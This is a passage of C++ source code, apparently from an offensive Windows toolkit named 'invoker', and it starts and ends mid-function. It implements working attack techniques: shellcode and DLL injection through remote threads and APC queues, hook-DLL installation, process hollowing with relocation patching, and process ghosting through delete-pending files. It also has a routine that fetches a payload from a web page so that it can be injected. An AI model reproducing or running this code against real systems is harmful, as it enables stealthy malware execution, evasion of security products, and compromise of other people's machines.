			DWORD tid = GetProcessMainThreadID(pid, &hSnapshot);
			printf("############################### THREADS LIST ###############################\n");
			printf("#  %-6s  |  %-14s  |  %-14s  |  %-21s  #\n", "TID", "PRIORITY", "MAIN ", "PID");
			printf("#--------------------------------------------------------------------------#\n");
			Thread32First(hSnapshot, &entry);
			do {
				if (entry.th32OwnerProcessID == pid) {
					printf("#  %-6lu  |  %-14ld  |  %-14s  |  %-21lu  #\n", entry.th32ThreadID, entry.tpBasePri, entry.th32ThreadID == tid ? "YES" : "", entry.th32OwnerProcessID);
				}
			} while (Thread32Next(hSnapshot, &entry));
			printf("################################### INFO ###################################\n");
			printf("# This TID : %-61lu #\n", GetCurrentThreadId());
			printf("############################################################################\n");
			std::string input = Input("Enter thread ID");
			if (input.length() < 1) {
				printf("\n");
				printf("Thread ID is rquired\n");
			}
			else if (!StrToDWORD(input, &tid)) {
				printf("\n");
				printf("Cannot convert the thread ID to DWORD\n");
			}
			else {
				Thread32First(hSnapshot, &entry);
				do {
					if (entry.th32OwnerProcessID == pid && entry.th32ThreadID == tid) {
						*out = entry.th32ThreadID;
						success = true;
						break;
					}
				} while (Thread32Next(hSnapshot, &entry));
				if (!success) {
					printf("\n");
					printf("Thread does not exists\n");
				}
			}
			CloseHandle(hSnapshot);
		}
		return success;
	}

	// NOTE: Your DLL must export GetHookType() and HookProc() methods.
	// NOTE: Read more at https://github.com/ivan-sincek/invoker#make-a-dll-with-a-hook-procedure.
	void HookJob(PHOOK info) {
		info->active = true;
		HMODULE hLib = LoadLibraryExA(info->file.c_str(), NULL, DONT_RESOLVE_DLL_REFERENCES);
		if (hLib == NULL) {
			printf("Cannot load \"%s\"\n", info->file.c_str());
		}
		else {
			FARPROC GetHookType = (FARPROC)GetProcAddress(hLib, "GetHookType");
			if (GetHookType == NULL) {
				printf("Cannot get the GetHookType() address\n");
			}
			else {
				HOOKPROC HookProc = (HOOKPROC)GetProcAddress(hLib, "HookProc");
				if (HookProc == NULL) {
					printf("Cannot get the HookProc() address\n");
				}
				else {
					HHOOK hHook = SetWindowsHookExA(GetHookType(), HookProc, hLib, info->rtid);
					if (hHook == NULL) {
						printf("Cannot install the hook procedure\n");
					}
					else {
						printf("Hook procedure has been installed successfully\n");
						MSG msg = { };
						while (GetMessageA(&msg, NULL, 0, 0) > 0) {
							TranslateMessage(&msg);
							DispatchMessageA(&msg);
						}
						if (UnhookWindowsHookEx(hHook) == 0) {
							printf("\n");
							printf("Cannot uninstall the hook procedure, local thread will now exit...\n");
						}
						else {
							printf("\n");
							printf("Hook procedure has been uninstalled successfully\n");
						}
						CloseHandle(hHook);
					}
				}
			}
			FreeLibrary(hLib);
		}
		*info = { };
	}

	bool RemoveHookThread(PHOOK info) {
		bool success = false;
		if (PostThreadMessageA(info->ltid, WM_QUIT, NULL, NULL) == 0) {
			printf("\n");
			printf("Cannot send the WM_QUIT message to the hook thread\n");
		}
		else {
			success = true;
			Sleep(400); // NOTE: Just a little delay to prevent the race condition while displaying an output message from the hook thread.
		}
		return success;
	}

	bool CreateHookThread(PHOOK info) {
		bool success = false;
		HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)HookJob, info, 0, &info->ltid);
		if (hThread == NULL) {
			printf("Cannot create the hook thread\n");
		}
		else {
			success = true;
			Sleep(400); // NOTE: Just a little delay to prevent the race condition while displaying an output message from the hook thread.
			CloseHandle(hThread);
		}
		return success;
	}

	// --------------------------------------- SECTION: BYTECODES

	std::string GetWebContent(std::string domain, DWORD port, std::string path, bool secure, std::string method, std::string agent) {
		std::string data = "";
		HINTERNET hSession = WinHttpOpen(std::wstring(agent.begin(), agent.end()).c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
		if (hSession == NULL) {
			printf("Cannot get the HTTP session handle\n");
		}
		else {
			HINTERNET hConnect = WinHttpConnect(hSession, std::wstring(domain.begin(), domain.end()).c_str(), port, 0);
			if (hConnect == NULL) {
				printf("Cannot connect to the server\n");
			}
			else {
				HINTERNET hRequest = WinHttpOpenRequest(hConnect, std::wstring(method.begin(), method.end()).c_str(), std::wstring(path.begin(), path.end()).c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, secure ? WINHTTP_FLAG_SECURE : 0);
				if (hRequest == NULL) {
					printf("Cannot get the HTTP request handle\n");
				}
				else {
					if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
						printf("Cannot send the HTTP request\n");
					}
					else if (!WinHttpReceiveResponse(hRequest, NULL)) {
						printf("No HTTP response has been received\n");
					}
					else {
						char* buffer = new char[STREAM_BUFFER_SIZE];
						DWORD bytes = 0;
						BOOL success = TRUE;
						while ((success = WinHttpReadData(hRequest, buffer, STREAM_BUFFER_SIZE, &bytes)) && bytes > 0) {
							data.append(buffer, bytes);
						}
						delete[] buffer;
						if (success != TRUE) {
							data.clear(); // NOTE: Clear the partially read data.
							printf("Failed to read the HTTP response\n");
						}
						else if (data.length() < 1) {
							printf("HTTP response is empty\n");
						}
					}
					WinHttpCloseHandle(hRequest);
				}
				WinHttpCloseHandle(hConnect);
			}
			WinHttpCloseHandle(hSession);
		}
		return data;
	}

	std::string ExtractPayload(std::string data, std::string element, std::string placeholder) {
		std::string payload = "";
		if (element.find(placeholder) == std::string::npos) {
			printf("Payload placeholder has not been found\n");
		}
		else {
			std::string front = StrStripRightFirst(element, placeholder);
			std::string back = StrStripLeftFirst(element, placeholder);
			if (front.length() < 1 || back.length() < 1) {
				printf("Payload must be enclosed from both, front and back\n");
			}
			else {
				data = StrStripRightFirst(data, back, true);
				data = StrStripLeftFirst(data, front, true);
				if (data.length() < 1) {
					printf("Custom element has not been found or is empty\n");
				}
				else {
					payload = data;
				}
			}
		}
		return payload;
	}

	bool InjectBytecode(DWORD pid, std::string bytecode) {
		bool success = false;
		HANDLE hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD), FALSE, pid);
		if (hProcess == NULL) {
			printf("Cannot get the process handle\n");
		}
		else {
			LPVOID addr = VirtualAllocEx(hProcess, NULL, bytecode.length(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
			if (addr == NULL) {
				printf("Cannot allocate the additional process memory\n");
			}
			else {
				DWORD old = 0;
				if (VirtualProtectEx(hProcess, addr, bytecode.length(), PAGE_EXECUTE_READWRITE, &old) == 0) {
					printf("Cannot change the process memory protection to executable\n");
				}
				else if (WriteProcessMemory(hProcess, addr, bytecode.c_str(), bytecode.length(), NULL) == 0) {
					printf("Cannot write to the process memory\n");
				}
				else {
					HANDLE hThread = CreateRemoteThread(hProcess, NULL, bytecode.length(), (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
					if (hThread == NULL) {
						printf("Cannot start the process thread\n");
					}
					else {
						success = true;
						printf("Bytecode has been injected successfully\n");
						Sleep(800); // NOTE: Prevent the race condition - freeing the memory before executing it.
						CloseHandle(hThread);
					}
				}
				VirtualFreeEx(hProcess, addr, 0, MEM_RELEASE);
			}
			CloseHandle(hProcess);
		}
		return success;
	}

	bool InjectBytecodeAPC(DWORD pid, std::string bytecode) {
		bool success = false;
		HANDLE hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE), FALSE, pid);
		if (hProcess == NULL) {
			printf("Cannot get the process handle\n");
		}
		else {
			LPVOID addr = VirtualAllocEx(hProcess, NULL, bytecode.length(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
			if (addr == NULL) {
				printf("Cannot allocate the additional process memory\n");
			}
			else {
				DWORD old = 0;
				if (VirtualProtectEx(hProcess, addr, bytecode.length(), PAGE_EXECUTE_READWRITE, &old) == 0) {
					printf("Cannot change the process memory protection to executable\n");
				}
				else if (WriteProcessMemory(hProcess, addr, bytecode.c_str(), bytecode.length(), NULL) == 0) {
					printf("Cannot write to the process memory\n");
				}
				else {
					// NOTE: Inject a bytecode to all process threads.
					HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
					if (hSnapshot == INVALID_HANDLE_VALUE) {
						printf("Cannot create the snapshot of the process threads\n");
					}
					else {
						THREADENTRY32 entry = { };
						entry.dwSize = sizeof(entry);
						Thread32First(hSnapshot, &entry);
						do {
							if (entry.th32OwnerProcessID == pid) {
								HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, entry.th32ThreadID);
								if (hThread != NULL) {
									if (QueueUserAPC((PAPCFUNC)addr, hThread, NULL) != 0) {
										success = true;
									}
									CloseHandle(hThread);
								}
							}
						} while (Thread32Next(hSnapshot, &entry));
						if (!success) {
							printf("Cannot queue the user-mode asynchronous procedure calls\n");
						}
						else {
							printf("Bytecode has been injected successfully\n");
							Sleep(1600); // NOTE: Prevent the race condition - freeing the memory before executing it.
						}
						CloseHandle(hSnapshot);
					}
				}
				VirtualFreeEx(hProcess, addr, 0, MEM_RELEASE);
			}
			CloseHandle(hProcess);
		}
		return success;
	}

	// --------------------------------------- SECTION: EXECUTABLE IMAGE TAMPERING

	bool ProcessHollowing(std::string bytecode, std::string file, std::string args) {
		bool success = false;
		PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)bytecode.c_str();
		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(bytecode.c_str() + dosHeader->e_lfanew);
		if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE || ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
			printf("Invalid PE format\n");
		}
		else {
			STARTUPINFOA sInfo = { };
			sInfo.cb = sizeof(sInfo);
			PROCESS_INFORMATION pInfo = { };
			if (CreateProcessA(file.length() > 0 ? file.c_str() : NULL, (LPSTR)args.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo) == 0) {
				printf("Cannot run the process\n");
			}
			else {
				CONTEXT tContext = { };
				tContext.ContextFlags = CONTEXT_INTEGER;
				if (GetThreadContext(pInfo.hThread, &tContext) == 0) {
					printf("Cannot get the process thread context\n");
				}
				else {
#if _WIN64
					ULONG_PTR reg = tContext.Rdx + 16;
#else
					ULONG_PTR reg = tContext.Ebx + 8;
#endif
					LPVOID addr = NULL;
					if (ReadProcessMemory(pInfo.hProcess, (LPCVOID)reg, &addr, sizeof(addr), NULL) == 0) {
						printf("Cannot get the process image memory base address\n");
					}
					else {
						HMODULE hLib = GetModuleHandleA("ntdll.dll");
						if (hLib == NULL) {
							printf("Cannot get the handle to \"ntdll.dll\"\n");
						}
						else {
							NtUnmapViewOfSection _NtUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hLib, "NtUnmapViewOfSection");
							if (_NtUnmapViewOfSection == NULL) {
								printf("Cannot get the NtUnmapViewOfSection() address\n");
							}
							else if (_NtUnmapViewOfSection(pInfo.hProcess, (PVOID)addr) != STATUS_SUCCESS) {
								printf("Cannot unmap the process image memory\n");
							}
							else {
								addr = VirtualAllocEx(pInfo.hProcess, addr, ntHeaders->OptionalHeader.SizeOfImage, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
								if (addr == NULL) {
									printf("Cannot allocate the process image memory\n");
								}
								else {
									// NOTE: The address offset.
									ULONG_PTR delta = (ULONG_PTR)addr - ntHeaders->OptionalHeader.ImageBase;
									ntHeaders->OptionalHeader.ImageBase = (ULONG_PTR)addr;
									DWORD old = 0;
									if (VirtualProtectEx(pInfo.hProcess, addr, ntHeaders->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE, &old) == 0) {
										printf("Cannot change the process image memory protection to executable\n");
									}
									else if (WriteProcessMemory(pInfo.hProcess, addr, bytecode.c_str(), ntHeaders->OptionalHeader.SizeOfHeaders, NULL) == 0) {
										printf("Cannot write the PE headers to the process image memory\n");
									}
									else {
										bool error = false;
										PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)(bytecode.c_str() + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
										for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
											if (sectionHeader[i].PointerToRawData && WriteProcessMemory(pInfo.hProcess, (LPVOID)((ULONG_PTR)addr + sectionHeader[i].VirtualAddress), (LPCVOID)(bytecode.c_str() + sectionHeader[i].PointerToRawData), sectionHeader[i].SizeOfRawData, NULL) == 0) {
												error = true;
												break;
											}
										}
										if (error) {
											printf("Cannot write the PE sections to the process image memory\n");
										}
										else {
											if (delta) {
												// NOTE: Patch the address offset.
												IMAGE_DATA_DIRECTORY relocationData = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
												for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections && !error; i++) {
													const char name[] = ".reloc";
													if (memcmp(sectionHeader[i].Name, name, strlen(name)) == 0) {
														DWORD offset = 0;
														while (offset < relocationData.Size && !error) {
															PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(bytecode.c_str() + sectionHeader[i].PointerToRawData + offset);
															offset += sizeof(BASE_RELOCATION_BLOCK);
															PBASE_RELOCATION_ENTRY relocationEntry = (PBASE_RELOCATION_ENTRY)(bytecode.c_str() + sectionHeader[i].PointerToRawData + offset);
															DWORD size = (relocationBlock->Size - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
															for (DWORD j = 0; j < size && !error; j++) {
																offset += sizeof(BASE_RELOCATION_ENTRY);
																if (relocationEntry[j].Type != 0) {
																	ULONG_PTR patched = (ULONG_PTR)addr + relocationBlock->Address + relocationEntry[j].Offset;
																	ULONG_PTR buffer = 0;
																	if (ReadProcessMemory(pInfo.hProcess, (LPCVOID)patched, &buffer, sizeof(buffer), NULL) == 0) {
																		error = true;
																		break;
																	}
																	buffer += delta;
																	if (WriteProcessMemory(pInfo.hProcess, (LPVOID)patched, &buffer, sizeof(buffer), NULL) == 0) {
																		error = true;
																		break;
																	}
																}
															}
														}
														break;
													}
												}
											}
											if (delta && error) {
												printf("Cannot patch the address offsets\n");
											}
											else if (WriteProcessMemory(pInfo.hProcess, (LPVOID)reg, &ntHeaders->OptionalHeader.ImageBase, sizeof(ntHeaders->OptionalHeader.ImageBase), NULL) == 0) {
												printf("Cannot write the base address to the process image memory\n");
											}
											else {
#if _WIN64
												tContext.Rcx = (ULONG_PTR)addr + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
												tContext.Eax = (ULONG_PTR)addr + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif
												if (SetThreadContext(pInfo.hThread, &tContext) == 0) {
													printf("Cannot set the process thread context\n");
												}
												else if (ResumeThread(pInfo.hThread) == -1) {
													printf("Cannot resume the process thread\n");
												}
												else {
													success = true;
													printf("Process has been run successfully (PID: %lu | TID: %lu)\n", pInfo.dwProcessId, pInfo.dwThreadId);
													Sleep(800); // NOTE: Prevent the race condition - freeing the memory before executing it.
													// WaitForSingleObject(pInfo.hThread, INFINITE);
												}
											}
										}
									}
									VirtualFreeEx(pInfo.hProcess, addr, 0, MEM_RELEASE);
								}
							}
						}
					}
				}
				if (!success) {
					TerminateProcess(pInfo.hProcess, EXIT_SUCCESS);
				}
				CloseHandle(pInfo.hThread); CloseHandle(pInfo.hProcess);
			}
		}
		return success;
	}

	// -------------------- PROCESS GHOSTING

	bool SetDeletePendingFileProcessParams(PHANDLE hProcess, PRTL_USER_PROCESS_PARAMETERS params, PROCESS_BASIC_INFORMATION pbInfo) {
		bool success = true;
		ULONG_PTR start = (ULONG_PTR)params, end = (ULONG_PTR)params + params->Length;
		if (params->Environment) {
			if (start > (ULONG_PTR)params->Environment) {
				start = (ULONG_PTR)params->Environment;
			}
			if (end < (ULONG_PTR)params->Environment + params->EnvironmentSize) {
				end = (ULONG_PTR)params->Environment + params->EnvironmentSize;
			}
		}
		LPVOID addr = VirtualAllocEx(*hProcess, (LPVOID)start, end - start, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
		if (addr == NULL || WriteProcessMemory(*hProcess, params, params, params->Length, NULL) == 0 || (params->Environment && WriteProcessMemory(*hProcess, params->Environment, params->Environment, params->EnvironmentSize, NULL) == 0) || WriteProcessMemory(*hProcess, &((PPEB)pbInfo.PebBaseAddress)->ProcessParameters, &params, sizeof(params), NULL) == 0) {
			success = false;
			if (addr != NULL) {
				VirtualFreeEx(*hProcess, addr, 0, MEM_RELEASE);
			}
		}
		return success;
	}

	bool RunDeletePendingFileThread(std::string file, LPVOID addr, DWORD size, PHANDLE hProcess, PHANDLE hThread) {
		// ---------- IMPORTS BEGIN
		HMODULE hLib = GetModuleHandleA("ntdll.dll");
		if (hLib == NULL) {
			printf("Cannot get the handle to \"ntdll.dll\"\n");
			return false;
		}
		NtQueryInformationProcess _NtQueryInformationProcess = (NtQueryInformationProcess)GetProcAddress(hLib, "NtQueryInformationProcess");
		if (_NtQueryInformationProcess == NULL) {
			printf("Cannot get the NtQueryInformationProcess address()\n");
			return false;
		}
		RtlInitUnicodeString _RtlInitUnicodeString = (RtlInitUnicodeString)GetProcAddress(hLib, "RtlInitUnicodeString");
		if (_RtlInitUnicodeString == NULL) {
			printf("Cannot get the RtlInitUnicodeString() address\n");
			return false;
		}
		RtlCreateProcessParametersEx _RtlCreateProcessParametersEx = (RtlCreateProcessParametersEx)GetProcAddress(hLib, "RtlCreateProcessParametersEx");
		if (_RtlCreateProcessParametersEx == NULL) {
			printf("Cannot get the RtlCreateProcessParametersEx() address\n");
			return false;
		}
		NtReadVirtualMemory _NtReadVirtualMemory = (NtReadVirtualMemory)GetProcAddress(hLib, "NtReadVirtualMemory");
		if (_NtReadVirtualMemory == NULL) {
			printf("Cannot get the NtReadVirtualMemory() address\n");
			return false;
		}
		NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)GetProcAddress(hLib, "NtCreateThreadEx");
		if (_NtCreateThreadEx == NULL) {
			printf("Cannot get the address of NtCreateThreadEx()\n");
			return false;
		}
		// ---------- IMPORTS END
		bool success = false;
		PROCESS_BASIC_INFORMATION pbInfo = { };
		if (_NtQueryInformationProcess(*hProcess, ProcessBasicInformation, &pbInfo, sizeof(pbInfo), NULL) != STATUS_SUCCESS) {
			printf("Cannot get the delete pending file process information\n");
		}
		else {
			UNICODE_STRING uFile = { };
			_RtlInitUnicodeString(&uFile, std::wstring(file.begin(), file.end()).c_str());
			UNICODE_STRING uTitle = { };
			_RtlInitUnicodeString(&uTitle, L"Invoked Ghost");
			PRTL_USER_PROCESS_PARAMETERS params = { };
			if (_RtlCreateProcessParametersEx(&params, &uFile, NULL, NULL, &uFile, NULL, &uTitle, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED) != STATUS_SUCCESS) {
				printf("Cannot prepare the delete pending file process information\n");
			}
			else if (!SetDeletePendingFileProcessParams(hProcess, params, pbInfo)) {
				printf("Cannot set the delete pending file process information\n");
			}
			else {
				PEB peb = { };
				if (_NtReadVirtualMemory(*hProcess, pbInfo.PebBaseAddress, &peb, sizeof(peb), NULL) != STATUS_SUCCESS) {
					printf("Cannot read the delete pending file process memory\n");
				}
				else {
					PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)addr + ((PIMAGE_DOS_HEADER)addr)->e_lfanew);
					ULONG_PTR lpRoutine = (ULONG_PTR)peb.ImageBaseAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint;
					if (_NtCreateThreadEx(hThread, THREAD_QUERY_LIMITED_INFORMATION, NULL, *hProcess, (LPTHREAD_START_ROUTINE)lpRoutine, NULL, FALSE, 0, 0, 0, NULL) != STATUS_SUCCESS) {
						printf("Cannot start the delete pending file process thread\n");
					}
					else {
						success = true;
					}
				}
			}
		}
		return success;
	}

	bool RunDeletePendingFileProcess(std::string tmp, LPVOID addr, DWORD size, PHANDLE hProcess) {
		// ---------- IMPORTS BEGIN
		HMODULE hLib = GetModuleHandleA("ntdll.dll");
		if (hLib == NULL) {
			printf("Cannot get the handle to \"ntdll.dll\"\n");
			return false;
		}
		RtlInitUnicodeString _RtlInitUnicodeString = (RtlInitUnicodeString)GetProcAddress(hLib, "RtlInitUnicodeString");
		if (_RtlInitUnicodeString == NULL) {
			printf("Cannot get the RtlInitUnicodeString() address\n");
			return false;
		}
		NtOpenFile _NtOpenFile = (NtOpenFile)GetProcAddress(hLib, "NtOpenFile");
		if (_NtOpenFile == NULL) {
			printf("Cannot get the NtOpenFile() address\n");
			return false;
		}
		NtSetInformationFile _NtSetInformationFile = (NtSetInformationFile)GetProcAddress(hLib, "NtSetInformationFile");
		if (_NtSetInformationFile == NULL) {
			printf("Cannot get the NtSetInformationFile() address\n");
			return false;
		}
		NtWriteFile _NtWriteFile = (NtWriteFile)GetProcAddress(hLib, "NtWriteFile");
		if (_NtWriteFile == NULL) {
			printf("Cannot get the NtWriteFile() address\n");
			return false;
		}
		NtCreateSection _NtCreateSection = (NtCreateSection)GetProcAddress(hLib, "NtCreateSection");
		if (_NtCreateSection == NULL) {
			printf("Cannot get the NtCreateSection() address\n");
			return false;
		}
		NtCreateProcessEx _NtCreateProcessEx = (NtCreateProcessEx)GetProcAddress(hLib, "NtCreateProcessEx");
		if (_NtCreateProcessEx == NULL) {
			printf("Cannot get the NtCreateProcessEx() address\n");
			return false;
		}
		// ---------- IMPORTS END
		bool success = false;
		HANDLE hFile = NULL;
		OBJECT_ATTRIBUTES attributes = { };
		UNICODE_STRING uFile = { };
		std::wstring file = L"\\??\\" + std::wstring(tmp.begin(), tmp.end());
		_RtlInitUnicodeString(&uFile, file.c_str());
		InitializeObjectAttributes(&attributes, &uFile, OBJ_CASE_INSENSITIVE, NULL, NULL);
		IO_STATUS_BLOCK status = { };
		if (_NtOpenFile(&hFile, (GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE), &attributes, &status, 0, (FILE_SUPERSEDED | FILE_SYNCHRONOUS_IO_NONALERT)) != STATUS_SUCCESS) {
			printf("Cannot create \"%s\"\n", tmp.c_str());
		}
		else {
			FILE_DISPOSITION_INFORMATION info = { };
			info.DeleteFile = TRUE;
			if (_NtSetInformationFile(hFile, &status, &info, sizeof(info), FileDispositionInformation) != STATUS_SUCCESS) {
				printf("Cannot set the file information for \"%s\"\n", tmp.c_str());
			}
			else if (_NtWriteFile(hFile, NULL, NULL, NULL, &status, (PVOID)addr, size, NULL, NULL) != STATUS_SUCCESS) {
				printf("Cannot write to \"%s\"\n", tmp.c_str());
			}
			else {
				HANDLE hSection = NULL;
				if (_NtCreateSection(&hSection, SECTION_MAP_EXECUTE, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFile) != STATUS_SUCCESS) {
					printf("Cannot create the section object of \"%s\"\n", tmp.c_str());
				}
				else {
					if (_NtCreateProcessEx(hProcess, (PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD), NULL, GetCurrentProcess(), 0, hSection, NULL, NULL, 0) != STATUS_SUCCESS) {
						printf("Cannot run the process from the section object of \"%s\"\n", tmp.c_str());
					}
					else {
						success = true;
					}
					CloseHandle(hSection);
				}
			}
			CloseHandle(hFile);
		}
		return success;
	}

	bool ProcessGhosting(std::string executable, std::string file) {
		bool success = false;
		DWORD size = 0;
		LPVOID addr = NULL;
		if (GetFileMappingAddr(executable, &size, &addr)) {
			char path[MAX_PATH + 1] = "", tmp[sizeof(path) * 2] = "";
			if (GetTempPathA(sizeof(path), path) == 0 || GetTempFileNameA(path, "C2C", 0, tmp) == 0) {
				printf("Cannot generate a temporary file name\n");
			}
			else {
				HANDLE hProcess = NULL;
				if (RunDeletePendingFileProcess(tmp, addr, size, &hProcess)) {
					HANDLE hThread = NULL;
					if (RunDeletePendingFileThread(file, addr, size, &hProcess, &hThread)) {
						success = true;
						printf("Process has been run successfully (PID: %lu | TID %lu | File: %s)\n", GetProcessId(hProcess), GetThreadId(hThread), tmp);
						Sleep(800); // NOTE: Prevent the race condition - freeing the memory before executing it.
						// WaitForSingleObject(pInfo.hThread, INFINITE);
						CloseHandle(hThread);
					}
					CloseHandle(hProcess);
				}
			}
			VirtualFree(addr, 0, MEM_RELEASE);
		}
		return success;
	}

	// --------------------------------------- SECTION: DLLS

	bool InjectDLL(DWORD pid, std::string file) {
		bool success = false;
		HANDLE hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD), FALSE, pid);
		if (hProcess == NULL) {
			printf("Cannot get the process handle\n");
		}
		else {
			LPVOID addr = VirtualAllocEx(hProcess, NULL, file.length(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
			if (addr == NULL) {
				printf("Cannot allocate the additional process memory\n");
			}
			else {
				if (WriteProcessMemory(hProcess, addr, file.c_str(), file.length(), NULL) == 0) {
					printf("Cannot write to the process memory\n");
				}
				else {
					HMODULE hLib = GetModuleHandleA("kernel32.dll");
					if (hLib == NULL) {
						printf("Cannot get the handle to \"kernel32.dll\"\n");
					}
					else {
						LPTHREAD_START_ROUTINE lpRoutine = (LPTHREAD_START_ROUTINE)GetProcAddress(hLib, "LoadLibraryA");
						if (lpRoutine == NULL) {
							printf("Cannot get the LoadLibraryA() address\n");
						}
						else {
							HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, lpRoutine, addr, 0, NULL);
							if (hThread == NULL) {
								printf("Cannot start the process thread\n");
							}
							else {
								success = true;
								printf("DLL has been injected successfully\n");
								Sleep(800); // NOTE: Prevent the race condition - freeing the memory before executing it.
								CloseHandle(hThread);
							}
						}
					}
				}
				VirtualFreeEx(hProcess, addr, 0, MEM_RELEASE);
			}
			CloseHandle(hProcess);
		}
		return success;
	}

	bool InjectDLLAPC(DWORD pid, std::string file) {
		bool success = false;
		HANDLE hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE), FALSE, pid);
		if (hProcess == NULL) {
			printf("Cannot get the process handle\n");
		}
		else {
			LPVOID addr = VirtualAllocEx(hProcess, NULL, file.length(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
			if (addr == NULL) {
				printf("Cannot allocate the additional process memory\n");
			}
			else {
				if (WriteProcessMemory(hProcess, addr, file.c_str(), file.length(), NULL) == 0) {
					printf("Cannot write to the process memory\n");
				}
				else {
					HMODULE hLib = GetModuleHandleA("kernel32.dll");
					if (hLib == NULL) {
						printf("Cannot get the handle to \"kernel32.dll\"\n");
					}
					else {
						PAPCFUNC lpRoutine = (PAPCFUNC)GetProcAddress(hLib, "LoadLibraryA");
						if (lpRoutine == NULL) {
							printf("Cannot get the LoadLibraryA() address\n");
						}
						else {
							// NOTE: Inject a DLL to all process threads.
							HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
							if (hSnapshot == INVALID_HANDLE_VALUE) {
								printf("Cannot create the snapshot of the process threads\n");
							}
							else {
								THREADENTRY32 entry = { };
								entry.dwSize = sizeof(entry);
								Thread32First(hSnapshot, &entry);
								do {
									if (entry.th32OwnerProcessID == pid) {
										HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, entry.th32ThreadID);
										if (hThread != NULL) {
											if (QueueUserAPC(lpRoutine, hThread, (ULONG_PTR)addr) != 0) {
												success = true;
											}
											CloseHandle(hThread);
										}
									}
								} while (Thread32Next(hSnapshot, &entry));
								if (!success) {
									printf("Cannot queue the user-mode asynchronous procedure call\n");
								}
								else {
									printf("DLL has been injected successfully\n");
									Sleep(1600); // NOTE: Prevent the race condition - freeing the memory before executing it.
								}
								CloseHandle(hSnapshot);
							}
						}
					}
				}
				VirtualFreeEx(hProcess, addr, 0, MEM_RELEASE);
			}
			CloseHandle(hProcess);
		}
		return success;
	}

	// NOTE: This method will show only loaded DLLs.
	// TO DO: List missing DLLs.
	void ListProcessDLLs(DWORD pid) {
		HANDLE hSnapshot = CreateToolhelp32Snapshot((TH32CS_SNAPMODULE32 | TH32CS_SNAPMODULE), pid);
		if (hSnapshot == INVALID_HANDLE_VALUE) {
			printf("Cannot create the snapshot of the process DLLs\n");
		}
		else {
			MODULEENTRY32W entry = { };
			entry.dwSize = sizeof(entry);
			Module32FirstW(hSnapshot, &entry);
			do {
				printf("%ls\n", entry.szExePath);
			} while (Module32NextW(hSnapshot, &entry));
			CloseHandle(hSnapshot);
		}
	}

	bool NetMan() {
		bool success = false;
		HMODULE hLib = LoadLibraryA("netshell.dll");
		if (hLib == NULL) {
			printf("Cannot load \"netshell.dll\"\n");
		}
		else {
			NcFreeNetconProperties _NcFreeNetconProperties = (NcFreeNetconProperties)GetProcAddress(hLib, "NcFreeNetconProperties");
			if (_NcFreeNetconProperties == NULL) {
				printf("Cannot get the NcFreeNetconProperties() address\n");
			}
			else {
				if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) {
					printf("Cannot initialize the COM the library for use\n");
				}
				else {
					INetConnectionManager* manager = NULL;
					if (FAILED(CoCreateInstance(CLSID_ConnectionManager, NULL, CLSCTX_ALL, IID_INetConnectionManager, (LPVOID*)&manager))) {
						printf("Cannot create the Connection Manager COM class object\n");
					}
					else {
						IEnumNetConnection* connections = NULL;
						if (FAILED(manager->EnumConnections(NCME_DEFAULT, &connections))) {
							printf("Cannot enumerate the network interfaces\n");
						}
						else {
							INetConnection* connection = NULL;
							ULONG returned = 0;
							while (SUCCEEDED(connections->Next(1, &connection, &returned)) && returned > 0) {
								NETCON_PROPERTIES* properties = NULL;
								if (SUCCEEDED(connection->GetProperties(&properties))) {
									success = true;
